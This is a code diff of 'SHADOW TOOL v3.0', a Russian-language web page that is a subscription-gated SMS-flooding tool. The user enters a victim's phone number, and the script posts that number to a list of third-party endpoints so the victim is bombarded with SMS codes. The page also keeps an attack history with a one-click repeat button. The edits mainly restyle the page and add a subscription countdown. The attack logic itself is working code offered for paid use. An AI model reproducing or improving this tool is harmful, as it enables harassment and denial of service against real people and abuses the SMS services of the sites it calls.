@@ -33,18 +33,16 @@
             letter-spacing: 3px;
             text-shadow: 0 0 10px #00ff00;
         }
-        .author {
+        .version {
             text-align: center;
             color: #00cc00;
-            font-size: 13px;
-            margin-bottom: 25px;
-            letter-spacing: 1px;
+            font-size: 12px;
+            margin-bottom: 20px;
         }
         .tabs {
             display: flex;
             gap: 8px;
             margin-bottom: 20px;
-            flex-wrap: wrap;
         }
         .tab-btn {
             flex: 1;
@@ -54,22 +52,16 @@
             padding: 12px;
             cursor: pointer;
             text-align: center;
-            transition: 0.3s;
             font-weight: bold;
             border-radius: 8px;
         }
         .tab-btn.active {
             background: #00ff00;
             color: #000000;
-            text-shadow: none;
         }
-        .tab-content {
-            display: none;
-        }
-        .tab-content.active {
-            display: block;
-        }
-        input, select {
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        input {
             width: 100%;
             padding: 14px;
             background: #111111;
@@ -79,9 +71,7 @@
             margin: 10px 0;
             border-radius: 8px;
         }
-        input::placeholder {
-            color: #888888;
-        }
+        input::placeholder { color: #888888; }
         button {
             width: 100%;
             padding: 14px;
@@ -93,12 +83,8 @@
             cursor: pointer;
             margin: 8px 0;
             border-radius: 8px;
-            transition: 0.2s;
         }
-        button:hover {
-            opacity: 0.85;
-            transform: scale(0.98);
-        }
+        button:hover { opacity: 0.85; }
         .logs {
             height: 220px;
             overflow-y: auto;
@@ -114,16 +100,8 @@
             border-left: 3px solid #00ff00;
             padding-left: 10px;
             margin: 8px 0;
-            word-break: break-all;
         }
-        .error-log { 
-            border-left-color: #ff4444; 
-            color: #ff8888; 
-        }
-        .warning-log { 
-            border-left-color: #ffaa00; 
-            color: #ffcc66; 
-        }
+        .error-log { border-left-color: #ff4444; color: #ff8888; }
         .status {
             position: fixed;
             bottom: 15px;
@@ -134,8 +112,17 @@
             color: #00ff00;
             font-size: 11px;
             border-radius: 20px;
-            font-weight: bold;
         }
+        .sub-info {
+            background: #111111;
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 15px;
+            text-align: center;
+        }
+        .sub-label { font-size: 11px; color: #00cc88; margin-bottom: 5px; }
+        .sub-days { font-size: 18px; font-weight: bold; color: #00ff00; }
         .stats {
             display: flex;
             gap: 12px;
@@ -149,42 +136,20 @@
             padding: 12px;
             border-radius: 10px;
         }
-        .stat-value { 
-            font-size: 28px; 
-            font-weight: bold; 
-            color: #00ff00; 
-        }
-        .stat-label { 
-            font-size: 11px; 
-            color: #00cc88; 
-            margin-top: 5px;
-        }
-        .history-table { 
-            width: 100%; 
-            font-size: 12px; 
-            border-collapse: collapse; 
-        }
-        .history-table th, .history-table td { 
-            padding: 8px; 
-            border-bottom: 1px solid #333333; 
-            text-align: left; 
-            color: #ffffff;
-        }
-        .history-table th {
-            color: #00ff00;
-        }
+        .stat-value { font-size: 28px; font-weight: bold; color: #00ff00; }
+        .stat-label { font-size: 11px; color: #00cc88; margin-top: 5px; }
+        .history-table { width: 100%; font-size: 12px; border-collapse: collapse; }
+        .history-table th, .history-table td { padding: 8px; border-bottom: 1px solid #333333; text-align: left; color: #ffffff; }
+        .history-table th { color: #00ff00; }
         .action-btn {
             background: #222222;
             border: 1px solid #00ff00;
             color: #00ff00;
             padding: 4px 10px;
             cursor: pointer;
-            margin: 0 3px;
             border-radius: 5px;
         }
-        a {
-            color: #00ff00;
-        }
+        a { color: #00ff00; }
         @media (max-width: 500px) {
             .container { padding: 18px; }
             h1 { font-size: 24px; }
@@ -194,20 +159,20 @@
 <body>
 <div class="container" id="app">
     <h1>⚡ SHADOW TOOL</h1>
-    <div class="author">v3.0</div>
+    <div class="version">v3.0</div>
 
     <!-- Формы входа/регистрации -->
     <div id="authForms">
         <div id="loginForm">
-            <input type="text" id="loginLogin" placeholder="📋 Логин">
-            <input type="password" id="loginPassword" placeholder="🔒 Пароль">
-            <button onclick="doLogin()">🔓 ВОЙТИ</button>
+            <input type="text" id="loginLogin" placeholder="Логин">
+            <input type="password" id="loginPassword" placeholder="Пароль">
+            <button onclick="doLogin()">ВОЙТИ</button>
             <p style="text-align:center; margin-top:12px;">Нет аккаунта? <a href="#" onclick="showRegister()">Регистрация</a></p>
         </div>
         <div id="registerForm" style="display:none">
-            <input type="text" id="regLogin" placeholder="📋 Логин">
-            <input type="password" id="regPassword" placeholder="🔒 Пароль">
-            <button onclick="doRegister()">📝 ЗАРЕГИСТРИРОВАТЬСЯ</button>
+            <input type="text" id="regLogin" placeholder="Логин">
+            <input type="password" id="regPassword" placeholder="Пароль">
+            <button onclick="doRegister()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
             <p style="text-align:center; margin-top:12px;">Уже есть аккаунт? <a href="#" onclick="showLogin()">Войти</a></p>
         </div>
         <div id="authError" style="color:#ff4444; text-align:center; margin-top:12px;"></div>
@@ -217,14 +182,17 @@
     <!-- Основной контент -->
     <div id="mainContent" style="display:none;">
         <div class="tabs">
-            <div class="tab-btn active" onclick="switchTab('attack')">🎯 АТАКА</div>
-            <div class="tab-btn" onclick="switchTab('history')">📜 ИСТОРИЯ</div>
-            <div class="tab-btn" onclick="switchTab('info')">ℹ️ ИНФО</div>
+            <div class="tab-btn active" onclick="switchTab('attack')">АТАКА</div>
+            <div class="tab-btn" onclick="switchTab('history')">ИСТОРИЯ</div>
         </div>
 
         <div id="attackTab" class="tab-content active">
-            <input type="text" id="phone" placeholder="📞 Введите номер телефона (+79001234567)">
-            <button onclick="startAttack()">🔥 НАЧАТЬ АТАКУ</button>
+            <input type="text" id="phone" placeholder="+79001234567">
+            <button onclick="startAttack()">НАЧАТЬ АТАКУ</button>
+            <div class="sub-info">
+                <div class="sub-label">ДО ОКОНЧАНИЯ ПОДПИСКИ</div>
+                <div class="sub-days" id="subDaysLeft">—</div>
+            </div>
             <div class="logs" id="logs"></div>
         </div>
 
@@ -233,29 +201,19 @@
                 <div class="stat-card"><div class="stat-value" id="totalCount">0</div><div class="stat-label">АТАК</div></div>
                 <div class="stat-card"><div class="stat-value" id="successRate">0%</div><div class="stat-label">УСПЕШНО</div></div>
             </div>
-            <button onclick="clearHistory()">🗑️ ОЧИСТИТЬ ИСТОРИЮ</button>
+            <button onclick="clearHistory()">ОЧИСТИТЬ ИСТОРИЮ</button>
             <div style="overflow-x:auto; margin-top:15px;">
                 <table class="history-table">
-                    <thead><tr><th>⏱️ Время</th><th>📞 Номер</th><th>📊 Статус</th><th>🔄 Действия</th></tr></thead>
+                    <thead><tr><th>Время</th><th>Номер</th><th>Статус</th><th></th></tr></thead>
                     <tbody id="historyBody"></tbody>
                 </table>
             </div>
         </div>
-
-        <div id="infoTab" class="tab-content">
-            <div style="background:#111111; padding:18px; border:1px solid #00ff00; border-radius:10px;">
-                <h3 style="color:#00ff00;">🛡️ SHADOW TOOL v3.0</h3>
-                <p style="margin:10px 0; color:#ffffff;">Инструмент для тестирования SMS-флуда</p>
-                <hr style="border-color:#00ff00; margin:12px 0;">
-                <p><strong style="color:#00ff00;">💳 Подписка:</strong> <span id="subStatusText" style="color:#ffffff;">Проверка...</span></p>
-            </div>
-        </div>
     </div>
-    <div class="status" id="status">⏳ ЗАГРУЗКА...</div>
+    <div class="status" id="status">ЗАГРУЗКА...</div>
 </div>
 
 <script>
-    // ========== НАСТРОЙКИ ==========
     const API_BASE = 'https://use-production-88cf.up.railway.app';
     
     const ATTACK_URLS = [
@@ -274,13 +232,14 @@
     let attackHistory = JSON.parse(localStorage.getItem('shadow_history')) || [];
     let currentToken = localStorage.getItem('token');
     let currentSubscription = false;
+    let subscriptionExpires = null;
 
     // ========== АВТОРИЗАЦИЯ ==========
     async function doRegister() {
         const login = document.getElementById('regLogin').value;
         const password = document.getElementById('regPassword').value;
         if (!login || !password) {
-            showAuthError('❌ Заполните все поля');
+            showAuthError('Заполните все поля');
             return;
         }
         showAuthError('');
@@ -294,14 +253,14 @@
             });
             const data = await res.json();
             if (data.success) {
-                showAuthSuccess('✅ Регистрация успешна! Теперь войдите в аккаунт.');
+                showAuthSuccess('Регистрация успешна! Теперь войдите.');
                 showLogin();
                 document.getElementById('loginLogin').value = login;
             } else {
-                showAuthError('❌ ' + data.error);
+                showAuthError(data.error);
             }
         } catch(e) {
-            showAuthError('❌ Ошибка соединения с сервером');
+            showAuthError('Ошибка соединения');
         }
     }
 
@@ -309,7 +268,7 @@
         const login = document.getElementById('loginLogin').value;
         const password = document.getElementById('loginPassword').value;
         if (!login || !password) {
-            showAuthError('❌ Заполните все поля');
+            showAuthError('Заполните все поля');
             return;
         }
         showAuthError('');
@@ -322,15 +281,14 @@
             });
             const data = await res.json();
             if (data.success) {
-                // Сохраняем токен в localStorage
                 localStorage.setItem('token', data.token);
                 currentToken = data.token;
                 await checkAuthAndLoad();
             } else {
-                showAuthError('❌ ' + data.error);
+                showAuthError(data.error);
             }
         } catch(e) {
-            showAuthError('❌ Ошибка соединения с сервером');
+            showAuthError('Ошибка соединения');
         }
     }
 
@@ -342,38 +300,57 @@
         }
         
         try {
-            // Проверяем токен через /me
             const meRes = await fetch(API_BASE + '/me', {
                 headers: { 'Authorization': 'Bearer ' + token }
             });
             if (!meRes.ok) {
-                // Токен невалидный, удаляем
                 localStorage.removeItem('token');
                 showAuth();
                 return;
             }
             
-            // Проверяем подписку
             const subRes = await fetch(API_BASE + '/check_subscription', {
                 headers: { 'Authorization': 'Bearer ' + token }
             });
             const subData = await subRes.json();
             currentSubscription = subData.has_access;
+            subscriptionExpires = subData.expires_at;
             
-            // Показываем интерфейс
             showApp();
             updateHistoryDisplay();
+            updateSubscriptionDisplay();
             
             if (currentSubscription) {
-                document.getElementById('status').innerHTML = '✅ ПОДПИСКА АКТИВНА';
-                document.getElementById('subStatusText').innerHTML = '✅ Активна';
+                document.getElementById('status').innerHTML = 'ГОТОВ';
             } else {
-                document.getElementById('status').innerHTML = '⚠️ НЕТ ПОДПИСКИ';
-                document.getElementById('subStatusText').innerHTML = '❌ Отсутствует';
+                document.getElementById('status').innerHTML = 'НЕТ ПОДПИСКИ';
             }
         } catch(e) {
-            console.error('Auth error:', e);
             showAuth();
+        }
+    }
+
+    function updateSubscriptionDisplay() {
+        const subDaysSpan = document.getElementById('subDaysLeft');
+        if (!subDaysSpan) return;
+        
+        if (!currentSubscription || !subscriptionExpires) {
+            subDaysSpan.innerHTML = 'Нет подписки';
+            subDaysSpan.style.color = '#ff8888';
+            return;
+        }
+        
+        const now = new Date();
+        const expireDate = new Date(subscriptionExpires);
+        const diffMs = expireDate - now;
+        const diffDays = Math.ceil(diffMs / (1000 * 60 * 60 * 24));
+        
+        if (diffDays <= 0) {
+            subDaysSpan.innerHTML = 'Истекла';
+            subDaysSpan.style.color = '#ff8888';
+        } else {
+            subDaysSpan.innerHTML = diffDays + ' дн.';
+            subDaysSpan.style.color = '#00ff00';
         }
     }
 
@@ -416,27 +393,25 @@
     // ========== АТАКА ==========
     async function startAttack() {
         if (!currentSubscription) {
-            addLog('⛔ У ВАС НЕТ АКТИВНОЙ ПОДПИСКИ! Обратитесь к администратору', true);
-            addLog('📌 Для использования инструмента необходимо приобрести подписку', true);
+            addLog('У ВАС НЕТ АКТИВНОЙ ПОДПИСКИ!', true);
             return;
         }
         
         const phone = document.getElementById('phone').value.trim();
-        const logsDiv = document.getElementById('logs');
-        logsDiv.innerHTML = '';
+        document.getElementById('logs').innerHTML = '';
         
         if (!phone) {
-            addLog('❌ Введите номер телефона', true);
+            addLog('Введите номер телефона', true);
             return;
         }
         
         const phoneRegex = /^(\+?[78]\d{10}$)|^(\+380\d{9}$)/;
         if (!phoneRegex.test(phone.replace(/\s+/g, ''))) {
-            addLog('❌ Неверный формат номера. Пример: +79001234567', true);
+            addLog('Неверный формат номера. Пример: +79001234567', true);
             return;
         }
 
-        addLog('🔍 Проверка номера в белом списке...');
+        addLog('Проверка белого списка...');
         try {
             const wRes = await fetch(API_BASE + '/is_whitelisted', {
                 method: 'POST',
@@ -445,15 +420,15 @@
             });
             const wData = await wRes.json();
             if (wData.blocked) {
-                addLog('⛔ Номер в белом списке. Атака заблокирована.', true);
+                addLog('Номер в белом списке. Атака заблокирована.', true);
                 return;
             }
         } catch(e) {
-            addLog('⚠️ Не удалось проверить белый список', true);
+            addLog('Не удалось проверить белый список', true);
         }
 
-        addLog(`🚀 Начинаю атаку на номер ${phone}`);
-        document.getElementById('status').innerHTML = '⚡ АТАКА В ПРОЦЕССЕ...';
+        addLog('Начинаю атаку...');
+        document.getElementById('status').innerHTML = 'АТАКА...';
         
         let success = 0;
         for (let i = 0; i < ATTACK_URLS.length; i++) {
@@ -465,9 +440,9 @@
                     body: `phone=${encodeURIComponent(phone)}`
                 });
                 success++;
-                addLog(`✅ Запрос ${i+1}/${ATTACK_URLS.length} отправлен`);
+                addLog(`Запрос ${i+1}/${ATTACK_URLS.length} отправлен`);
             } catch(e) {
-                addLog(`⚠️ Запрос ${i+1}/${ATTACK_URLS.length}: ошибка`, true);
+                addLog(`Запрос ${i+1}/${ATTACK_URLS.length}: ошибка`, true);
             }
             await new Promise(r => setTimeout(r, 100));
         }
@@ -482,10 +457,9 @@
         if (attackHistory.length > 30) attackHistory.pop();
         localStorage.setItem('shadow_history', JSON.stringify(attackHistory));
         
-        addLog(`🎯 АТАКА ЗАВЕРШЕНА! Успешно: ${success}/${ATTACK_URLS.length}`);
-        document.getElementById('status').innerHTML = currentSubscription ? '✅ ПОДПИСКА АКТИВНА' : '⚠️ НЕТ ПОДПИСКИ';
+        addLog(`АТАКА ЗАВЕРШЕНА! Успешно: ${success}/${ATTACK_URLS.length}`);
+        document.getElementById('status').innerHTML = 'ГОТОВ';
         updateHistoryDisplay();
-        document.getElementById('phone').value = '';
     }
 
     function addLog(msg, isError = false) {
@@ -508,13 +482,13 @@
         if (!tbody) return;
         
         if (total === 0) {
-            tbody.innerHTML = '<tr><td colspan="4" style="color:#888; text-align:center;">📭 История атак пуста</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="4" style="color:#888; text-align:center;">История атак пуста</td></tr>';
             return;
         }
         
         tbody.innerHTML = attackHistory.map(h => `
             <tr>
-                <td style="color:#ffffff;">${new Date(h.timestamp).toLocaleTimeString()}</td>
+                <td>${new Date(h.timestamp).toLocaleTimeString()}</td>
                 <td style="color:#00ff00;">${h.phone}</td>
                 <td style="color: ${h.success === h.total ? '#00ff00' : '#ff8888'}">${h.success}/${h.total}</td>
                 <td><button class="action-btn" onclick="repeatAttack('${h.phone}')">↺</button></td>
@@ -529,33 +503,29 @@
     }
 
     function clearHistory() {
-        if (confirm('Очистить всю историю атак?')) {
+        if (confirm('Очистить всю историю?')) {
             attackHistory = [];
             localStorage.setItem('shadow_history', JSON.stringify(attackHistory));
             updateHistoryDisplay();
-            addLog('🗑️ История атак очищена');
         }
     }
 
-    // ========== ТАБЫ ==========
     function switchTab(tab) {
         document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
         document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active'));
         if (tab === 'attack') {
             document.getElementById('attackTab').classList.add('active');
-            document.querySelector('.tabs .tab-btn:first-child').classList.add('active');
-        } else if (tab === 'history') {
-            document.getElementById('historyTab').classList.add('active');
-            document.querySelectorAll('.tabs .tab-btn')[1].classList.add('active');
-            updateHistoryDisplay();
+            document.querySelector('.tab-btn:first-child').classList.add('active');
         } else {
-            document.getElementById('infoTab').classList.add('active');
-            document.querySelectorAll('.tabs .tab-btn')[2].classList.add('active');
+            document.getElementById('historyTab').classList.add('active');
+            document.querySelectorAll('.tab-btn')[1].classList.add('active');
+            updateHistoryDisplay();
         }
     }
 
     // ========== ЗАПУСК ==========
     checkAuthAndLoad();
+    setInterval(() => updateSubscriptionDisplay(), 60000);
 </script>
 </body>
 </html>
